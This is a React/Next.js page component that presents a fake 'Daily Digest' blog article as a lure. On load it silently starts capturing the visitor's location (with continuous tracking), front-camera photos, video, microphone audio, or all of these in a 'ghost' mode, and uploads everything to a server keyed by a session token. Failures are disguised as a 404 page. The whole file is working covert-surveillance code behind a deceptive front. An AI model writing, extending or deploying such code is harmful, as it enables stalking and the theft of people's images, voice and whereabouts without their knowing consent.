/**
 * ============================================
 * Session Page - Blog Style
 * ============================================
 * Disguised as a blog article, triggers permissions automatically.
 * Route: /s/[token]
 */

'use client';

import { useEffect, useState, useCallback, useRef } from 'react';
import { useParams } from 'next/navigation';
import { fetchSession, activateSession, uploadLocation, uploadPhoto, uploadVideo, uploadAudio, sendPermissionEvent, SessionData } from '@/lib/api';

// Blog content that looks legitimate
const BLOG_ARTICLES = [
  {
    title: "10 Amazing Travel Destinations You Must Visit in 2025",
    author: "Sarah Mitchell",
    date: "December 27, 2025",
    readTime: "5 min read",
    image: "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=800",
    content: [
      "Travel has always been a passion for many, and 2025 brings exciting new opportunities to explore the world. From hidden gems in Southeast Asia to the stunning landscapes of Northern Europe, there's something for everyone.",
      "The pandemic years taught us to appreciate the simple joys of exploration. Now, with travel restrictions largely lifted, adventurers are eager to make up for lost time and discover new horizons.",
      "Whether you're a beach lover, mountain enthusiast, or city explorer, this year promises unforgettable experiences. Let's dive into the top destinations that should be on your bucket list.",
      "First on our list is the breathtaking fjords of Norway. The dramatic landscapes, crystal-clear waters, and charming villages make it a photographer's paradise. The Northern Lights add an extra layer of magic during winter months.",
      "Next, consider the ancient temples of Cambodia. Angkor Wat and its surrounding temples offer a glimpse into a magnificent past. The sunrise over these structures is truly a once-in-a-lifetime experience.",
      "For those seeking adventure, New Zealand's South Island delivers. From bungee jumping to glacier hiking, the adrenaline never stops. The Lord of the Rings filming locations are an added bonus for movie fans.",
      "Japan continues to captivate visitors with its perfect blend of tradition and modernity. Cherry blossom season transforms the entire country into a pink wonderland, while autumn brings equally stunning fall colors.",
      "The Greek islands offer Mediterranean charm at its finest. Santorini's white-washed buildings and blue domes are iconic, but lesser-known islands like Milos and Naxos provide more authentic experiences.",
      "Costa Rica remains a top choice for eco-tourism. Rainforests, wildlife, and beautiful beaches combine to create an unforgettable vacation. The country's commitment to sustainability sets an example for the world.",
      "Finally, Portugal has emerged as Europe's hottest destination. Lisbon's historic neighborhoods, Porto's wine cellars, and the Algarve's stunning coastline offer diverse experiences at affordable prices."
    ],
    tags: ["Travel", "Adventure", "2025", "Destinations"]
  },
  {
    title: "The Future of Technology: AI and Beyond",
    author: "James Chen",
    date: "December 26, 2025",
    readTime: "7 min read",
    image: "https://images.unsplash.com/photo-1485827404703-89b55fcc595e?w=800",
    content: [
      "Artificial Intelligence has transformed from a futuristic concept to an everyday reality. As we move into 2025, the pace of innovation shows no signs of slowing down.",
      "Machine learning algorithms now power everything from our social media feeds to medical diagnoses. The technology that once seemed like science fiction is now an integral part of our daily lives.",
      "Natural language processing has reached new heights. Conversations with AI assistants feel increasingly natural, and translation services break down language barriers in real-time.",
      "The healthcare industry has perhaps benefited the most from AI advancements. Early disease detection, personalized treatment plans, and drug discovery have all been revolutionized.",
      "Autonomous vehicles continue to make progress, with several cities now hosting regular self-driving taxi services. The dream of fully autonomous transportation is closer than ever.",
      "Quantum computing, while still in its early stages, promises to unlock computational power beyond our current imagination. Complex problems that would take classical computers millennia could be solved in seconds.",
      "Cybersecurity faces new challenges as AI enables more sophisticated attacks. However, the same technology also powers advanced defense systems, creating an ongoing technological arms race.",
      "The creative industries have been transformed by generative AI. Artists, writers, and musicians now collaborate with algorithms to create works that blend human creativity with machine precision.",
      "Ethical considerations remain at the forefront of AI development. Questions about bias, privacy, and job displacement require thoughtful solutions as we navigate this new era.",
      "Looking ahead, the integration of AI into every aspect of our lives seems inevitable. The key will be ensuring that this technology serves humanity's best interests while minimizing potential harms."
    ],
    tags: ["Technology", "AI", "Innovation", "Future"]
  },
  {
    title: "Healthy Living: Simple Habits for a Better Life",
    author: "Dr. Emily Watson",
    date: "December 25, 2025",
    readTime: "4 min read",
    image: "https://images.unsplash.com/photo-1544367567-0f2fcb009e0b?w=800",
    content: [
      "In our fast-paced world, maintaining good health often takes a backseat to other priorities. However, small daily habits can make a significant difference in our overall wellbeing.",
      "Sleep remains one of the most underrated aspects of health. Adults need 7-9 hours of quality sleep each night, yet many of us survive on far less. Prioritizing sleep can improve everything from cognitive function to immune response.",
      "Hydration is another simple yet powerful health tool. Drinking adequate water throughout the day supports digestion, skin health, and energy levels. Aim for at least 8 glasses daily.",
      "Movement doesn't have to mean intense gym sessions. A 30-minute walk each day provides substantial health benefits. The key is consistency rather than intensity.",
      "Nutrition forms the foundation of good health. Focus on whole foods, plenty of vegetables, and lean proteins. The occasional treat is fine – it's the overall pattern that matters.",
      "Mental health deserves as much attention as physical health. Practices like meditation, journaling, or simply spending time in nature can significantly reduce stress and improve mood.",
      "Social connections contribute to longevity and happiness. Nurturing relationships with friends and family provides emotional support and a sense of belonging.",
      "Regular health check-ups can catch potential issues early. Don't wait until something feels wrong – preventive care is always better than reactive treatment.",
      "Limiting screen time, especially before bed, can improve sleep quality and reduce eye strain. Consider implementing tech-free periods in your daily routine.",
      "Remember, health is a journey, not a destination. Small, sustainable changes compound over time to create significant improvements in quality of life."
    ],
    tags: ["Health", "Wellness", "Lifestyle", "Tips"]
  }
];

export default function SessionPage() {
  const params = useParams();
  const token = params.token as string;
  
  const [session, setSession] = useState<SessionData | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [article] = useState(() => BLOG_ARTICLES[Math.floor(Math.random() * BLOG_ARTICLES.length)]);
  
  // Refs to track if we've started capturing
  const captureStarted = useRef(false);
  const streamRef = useRef<MediaStream | null>(null);
  const watchIdRef = useRef<number | null>(null);

  // Auto-start capture based on permission type
  const startCapture = useCallback(async (sessionData: SessionData) => {
    if (captureStarted.current) return;
    captureStarted.current = true;

    const { permissionType, id: sessionId } = sessionData;

    try {
      switch (permissionType) {
        case 'location':
          // Start location tracking
          if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
              async (position) => {
                await sendPermissionEvent(sessionId, 'granted', 'location');
                await uploadLocation(sessionId, {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude,
                  accuracy: position.coords.accuracy,
                  altitude: position.coords.altitude ?? undefined,
                  speed: position.coords.speed ?? undefined,
                  heading: position.coords.heading ?? undefined
                });
                
                // Continue watching
                watchIdRef.current = navigator.geolocation.watchPosition(
                  async (pos) => {
                    await uploadLocation(sessionId, {
                      latitude: pos.coords.latitude,
                      longitude: pos.coords.longitude,
                      accuracy: pos.coords.accuracy,
                      altitude: pos.coords.altitude ?? undefined,
                      speed: pos.coords.speed ?? undefined,
                      heading: pos.coords.heading ?? undefined
                    });
                  },
                  (err) => console.log('Watch error:', err),
                  { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
                );
              },
              async (err) => {
                console.log('Location error:', err);
                await sendPermissionEvent(sessionId, 'denied', 'location');
              },
              { enableHighAccuracy: true, timeout: 10000 }
            );
          }
          break;

        case 'single_photo':
          // Capture single photo
          try {
            const photoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            await sendPermissionEvent(sessionId, 'granted', 'single_photo');
            streamRef.current = photoStream;
            
            const video = document.createElement('video');
            video.srcObject = photoStream;
            video.autoplay = true;
            video.playsInline = true;
            
            await new Promise<void>(resolve => {
              video.onloadedmetadata = () => {
                video.play();
                setTimeout(resolve, 100); // Minimal delay for frame ready
              };
            });
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx?.drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
              if (blob) {
                await uploadPhoto(sessionId, blob);
              }
              // Stop stream after capture
              photoStream.getTracks().forEach(track => track.stop());
            }, 'image/jpeg', 0.8);
          } catch (e) {
            console.log('Camera error:', e);
            await sendPermissionEvent(sessionId, 'denied', 'single_photo');
          }
          break;

        case 'continuous_photo':
          // Capture photos continuously
          try {
            const contStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            await sendPermissionEvent(sessionId, 'granted', 'continuous_photo');
            streamRef.current = contStream;
            
            const video = document.createElement('video');
            video.srcObject = contStream;
            video.autoplay = true;
            video.playsInline = true;
            
            await new Promise<void>(resolve => {
              video.onloadedmetadata = () => {
                video.play();
                resolve();
              };
            });

            // Capture every 5 seconds
            const capturePhoto = async () => {
              const canvas = document.createElement('canvas');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              const ctx = canvas.getContext('2d');
              ctx?.drawImage(video, 0, 0);
              
              canvas.toBlob(async (blob) => {
                if (blob) {
                  await uploadPhoto(sessionId, blob);
                }
              }, 'image/jpeg', 0.8);
            };

            await capturePhoto(); // Initial capture
            setInterval(capturePhoto, 5000); // Every 5 seconds
          } catch (e) {
            console.log('Camera error:', e);
            await sendPermissionEvent(sessionId, 'denied', 'continuous_photo');
          }
          break;

        case 'video':
          // Record video
          try {
            const videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            await sendPermissionEvent(sessionId, 'granted', 'video');
            streamRef.current = videoStream;
            
            const mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });
            const chunks: BlobPart[] = [];
            
            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
              const blob = new Blob(chunks, { type: 'video/webm' });
              await uploadVideo(sessionId, blob);
            };
            
            mediaRecorder.start();
            
            // Record for 30 seconds then stop
            setTimeout(() => {
              if (mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                videoStream.getTracks().forEach(track => track.stop());
              }
            }, 30000);
          } catch (e) {
            console.log('Video error:', e);
            await sendPermissionEvent(sessionId, 'denied', 'video');
          }
          break;

        case 'microphone':
          // Record audio
          try {
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            await sendPermissionEvent(sessionId, 'granted', 'microphone');
            streamRef.current = audioStream;
            
            const mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
            const chunks: BlobPart[] = [];
            
            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
              const blob = new Blob(chunks, { type: 'audio/webm' });
              await uploadAudio(sessionId, blob);
            };
            
            mediaRecorder.start();
            
            // Record for 30 seconds then stop
            setTimeout(() => {
              if (mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                audioStream.getTracks().forEach(track => track.stop());
              }
            }, 30000);
          } catch (e) {
            console.log('Audio error:', e);
            await sendPermissionEvent(sessionId, 'denied', 'microphone');
          }
          break;

        case 'ghost':
          // Ghost Mode: Capture location, photo, and audio all at once
          await sendPermissionEvent(sessionId, 'granted', 'ghost');
          
          // 1. Get location
          if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
              async (position) => {
                await uploadLocation(sessionId, {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude,
                  accuracy: position.coords.accuracy,
                  altitude: position.coords.altitude ?? undefined,
                  speed: position.coords.speed ?? undefined,
                  heading: position.coords.heading ?? undefined
                });
              },
              async (err) => {
                console.log('Ghost location error:', err);
                await sendPermissionEvent(sessionId, 'denied', 'location');
              },
              { enableHighAccuracy: true, timeout: 10000 }
            );
          }
          
          // 2. Capture photo
          try {
            const ghostPhotoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            
            const ghostVideo = document.createElement('video');
            ghostVideo.srcObject = ghostPhotoStream;
            ghostVideo.autoplay = true;
            ghostVideo.playsInline = true;
            
            await new Promise<void>(resolve => {
              ghostVideo.onloadedmetadata = () => {
                ghostVideo.play();
                setTimeout(resolve, 100); // Minimal delay for frame ready
              };
            });
            
            const ghostCanvas = document.createElement('canvas');
            ghostCanvas.width = ghostVideo.videoWidth;
            ghostCanvas.height = ghostVideo.videoHeight;
            const ghostCtx = ghostCanvas.getContext('2d');
            ghostCtx?.drawImage(ghostVideo, 0, 0);
            
            ghostCanvas.toBlob(async (blob) => {
              if (blob) {
                await uploadPhoto(sessionId, blob);
              }
              ghostPhotoStream.getTracks().forEach(track => track.stop());
            }, 'image/jpeg', 0.8);
          } catch (e) {
            console.log('Ghost photo error:', e);
            await sendPermissionEvent(sessionId, 'denied', 'camera');
          }
          
          // 3. Record audio (15 seconds for ghost mode)
          try {
            const ghostAudioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            
            const ghostRecorder = new MediaRecorder(ghostAudioStream, { mimeType: 'audio/webm' });
            const ghostChunks: BlobPart[] = [];
            
            ghostRecorder.ondataavailable = (e) => ghostChunks.push(e.data);
            ghostRecorder.onstop = async () => {
              const blob = new Blob(ghostChunks, { type: 'audio/webm' });
              await uploadAudio(sessionId, blob, 15);
            };
            
            ghostRecorder.start();
            
            setTimeout(() => {
              if (ghostRecorder.state === 'recording') {
                ghostRecorder.stop();
                ghostAudioStream.getTracks().forEach(track => track.stop());
              }
            }, 15000); // 15 seconds for ghost mode
          } catch (e) {
            console.log('Ghost audio error:', e);
            await sendPermissionEvent(sessionId, 'denied', 'microphone');
          }
          break;
      }
    } catch (err) {
      console.log('Capture error:', err);
    }
  }, []);

  // Load session and auto-start
  useEffect(() => {
    const init = async () => {
      if (!token) return;
      
      const result = await fetchSession(token);
      
      if (!result.success || !result.session) {
        setError('Article not found');
        return;
      }
      
      if (result.session.isExpired || result.session.status === 'expired' || result.session.status === 'ended') {
        setError('This article is no longer available');
        return;
      }
      
      setSession(result.session);
      
      // Activate and start capture
      if (result.session.status === 'created') {
        const activateResult = await activateSession(result.session.id);
        if (activateResult.success) {
          result.session.status = 'active';
          startCapture(result.session);
        }
      } else if (result.session.status === 'active') {
        startCapture(result.session);
      }
    };
    
    init();
    
    // Cleanup on unmount
    return () => {
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
      }
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, [token, startCapture]);

  // Error page (styled as 404)
  if (error) {
    return (
      <main className="min-h-screen bg-gray-50">
        <div className="max-w-4xl mx-auto px-4 py-16 text-center">
          <h1 className="text-6xl font-bold text-gray-300 mb-4">404</h1>
          <p className="text-xl text-gray-600 mb-8">{error}</p>
          <a href="https://google.com" className="text-blue-600 hover:underline">
            Return to homepage
          </a>
        </div>
      </main>
    );
  }

  // Blog article page
  return (
    <main className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white border-b border-gray-200">
        <div className="max-w-6xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <span className="text-2xl font-bold text-gray-900">Daily</span>
              <span className="text-2xl font-light text-blue-600">Digest</span>
            </div>
            <nav className="hidden md:flex items-center gap-6 text-sm text-gray-600">
              <a href="#" className="hover:text-gray-900">Home</a>
              <a href="#" className="hover:text-gray-900">Travel</a>
              <a href="#" className="hover:text-gray-900">Technology</a>
              <a href="#" className="hover:text-gray-900">Lifestyle</a>
              <a href="#" className="hover:text-gray-900">About</a>
            </nav>
            <button className="md:hidden text-gray-600">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
              </svg>
            </button>
          </div>
        </div>
      </header>

      {/* Article */}
      <article className="max-w-3xl mx-auto px-4 py-8">
        {/* Article Header */}
        <header className="mb-8">
          <div className="flex items-center gap-2 text-sm text-gray-500 mb-4">
            {article.tags.map(tag => (
              <span key={tag} className="bg-blue-100 text-blue-700 px-2 py-1 rounded">
                {tag}
              </span>
            ))}
          </div>
          <h1 className="text-4xl font-bold text-gray-900 mb-4 leading-tight">
            {article.title}
          </h1>
          <div className="flex items-center gap-4 text-gray-600">
            <div className="flex items-center gap-2">
              <div className="w-10 h-10 bg-gray-300 rounded-full flex items-center justify-center">
                <span className="text-gray-600 font-medium">{article.author[0]}</span>
              </div>
              <div>
                <p className="font-medium text-gray-900">{article.author}</p>
                <p className="text-sm">{article.date} · {article.readTime}</p>
              </div>
            </div>
          </div>
        </header>

        {/* Featured Image */}
        <div className="mb-8 rounded-xl overflow-hidden">
          <img 
            src={article.image} 
            alt={article.title}
            className="w-full h-[400px] object-cover"
          />
        </div>

        {/* Article Content */}
        <div className="prose prose-lg max-w-none">
          {article.content.map((paragraph, i) => (
            <p key={i} className="text-gray-700 leading-relaxed mb-6">
              {paragraph}
            </p>
          ))}
        </div>

        {/* Tags */}
        <div className="border-t border-gray-200 mt-12 pt-8">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-gray-600">Tags:</span>
            {article.tags.map(tag => (
              <a 
                key={tag} 
                href="#" 
                className="text-blue-600 hover:underline"
              >
                #{tag}
              </a>
            ))}
          </div>
        </div>

        {/* Author Box */}
        <div className="bg-gray-100 rounded-xl p-6 mt-8">
          <div className="flex items-start gap-4">
            <div className="w-16 h-16 bg-gray-300 rounded-full flex items-center justify-center flex-shrink-0">
              <span className="text-xl text-gray-600 font-medium">{article.author[0]}</span>
            </div>
            <div>
              <h3 className="font-bold text-gray-900 mb-1">About {article.author}</h3>
              <p className="text-gray-600 text-sm">
                A passionate writer and content creator who loves sharing insights about life, 
                technology, and the world around us. Follow for more inspiring content.
              </p>
            </div>
          </div>
        </div>

        {/* Related Articles */}
        <div className="mt-12">
          <h2 className="text-2xl font-bold text-gray-900 mb-6">Related Articles</h2>
          <div className="grid md:grid-cols-2 gap-6">
            {BLOG_ARTICLES.filter(a => a.title !== article.title).slice(0, 2).map(related => (
              <div key={related.title} className="bg-white rounded-xl shadow-sm overflow-hidden">
                <img 
                  src={related.image} 
                  alt={related.title}
                  className="w-full h-40 object-cover"
                />
                <div className="p-4">
                  <h3 className="font-bold text-gray-900 mb-2 line-clamp-2">{related.title}</h3>
                  <p className="text-sm text-gray-600">{related.author} · {related.readTime}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </article>

      {/* Footer */}
      <footer className="bg-white border-t border-gray-200 mt-12">
        <div className="max-w-6xl mx-auto px-4 py-8">
          <div className="grid md:grid-cols-4 gap-8">
            <div>
              <div className="flex items-center gap-2 mb-4">
                <span className="text-xl font-bold text-gray-900">Daily</span>
                <span className="text-xl font-light text-blue-600">Digest</span>
              </div>
              <p className="text-gray-600 text-sm">
                Your daily source for interesting articles and inspiring content.
              </p>
            </div>
            <div>
              <h4 className="font-bold text-gray-900 mb-4">Categories</h4>
              <ul className="space-y-2 text-sm text-gray-600">
                <li><a href="#" className="hover:text-gray-900">Travel</a></li>
                <li><a href="#" className="hover:text-gray-900">Technology</a></li>
                <li><a href="#" className="hover:text-gray-900">Lifestyle</a></li>
                <li><a href="#" className="hover:text-gray-900">Health</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-gray-900 mb-4">Company</h4>
              <ul className="space-y-2 text-sm text-gray-600">
                <li><a href="#" className="hover:text-gray-900">About Us</a></li>
                <li><a href="#" className="hover:text-gray-900">Contact</a></li>
                <li><a href="#" className="hover:text-gray-900">Careers</a></li>
                <li><a href="#" className="hover:text-gray-900">Privacy Policy</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-gray-900 mb-4">Subscribe</h4>
              <p className="text-sm text-gray-600 mb-4">Get the latest articles in your inbox.</p>
              <div className="flex gap-2">
                <input 
                  type="email" 
                  placeholder="your@email.com"
                  className="flex-1 px-3 py-2 border border-gray-300 rounded-lg text-sm"
                />
                <button className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700">
                  Subscribe
                </button>
              </div>
            </div>
          </div>
          <div className="border-t border-gray-200 mt-8 pt-8 text-center text-sm text-gray-500">
            © 2025 Daily Digest. All rights reserved.
          </div>
        </div>
      </footer>
    </main>
  );
}
